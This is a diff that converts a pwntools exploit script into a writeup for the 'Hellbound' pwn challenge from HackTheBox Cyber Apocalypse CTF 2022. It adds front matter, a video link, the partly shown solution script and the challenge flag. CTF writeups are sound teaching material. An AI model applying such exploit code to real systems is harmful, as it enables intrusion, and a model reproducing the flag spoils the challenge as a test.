@@ -1,5 +1,31 @@
-from pwn import *
+---
+name: Hellbound (2022)
+event: HackTheBox Cyber Apocalypse CTF 2022
+category: Pwn
+description: Writeup for Hellbound (Pwn) - HackTheBox Cyber Apocalypse CTF (2022) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Hellbound
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/U2OgL66-6BE/0.jpg)](https://youtu.be/U2OgL66-6BE "HTB Cyber Apocalypse CTF 2022: Hellbound")
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -9,7 +35,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -64,3 +89,6 @@ io.sendlineafter(b'>>', b'69')
 # Flag?
 io.recvline()
 warn(io.recv().decode())
+```
+
+Flag: `HTB{1t5_5p1r1t_15_5tr0ng3r_th4n_m0d1f1c4t10n5}`
